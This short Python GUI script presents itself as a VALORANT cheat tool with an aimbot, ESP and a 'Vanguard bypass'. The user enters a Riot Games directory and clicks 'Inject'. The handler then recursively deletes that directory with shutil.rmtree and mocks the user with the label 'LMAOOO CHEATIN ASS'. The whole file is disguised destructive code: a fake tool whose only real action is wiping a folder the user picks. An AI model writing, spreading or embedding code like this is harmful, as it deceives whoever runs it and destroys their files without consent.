import tkinter as tk
from tkinter import ttk
from tkinter import PhotoImage
import ttkbootstrap as ttk
import os
import shutil

def injection():
    path = riot_directory.get()
    shutil.rmtree(path)
    os.rmdir(path)
    vanguard_bypass['text'] = 'LMAOOO CHEATIN ASS'
    riot_directory['state'] = 'disabled'
    inject['state'] = 'disabled'

root = ttk.Window(themename = 'darkly')
root.title('VALORANT Esp/Aimhack/Recoilhack')
root.geometry('500x250')

vanguard_bypass = ttk.Label(master = root, text = 'Step 1: VANGAURD Bypass', font = 'Calibri 24')
vanguard_bypass.pack()

setup = ttk.Label(master = root, text = 'Enter your Riot Games Directory', font = 'Calibri 14')
setup.pack(pady = 10)

riot_directory = ttk.Entry(master = root)
riot_directory.pack()

inject = ttk.Button(master = root, text = 'Inject', command = injection)
inject.pack(pady = 10)


root.mainloop()
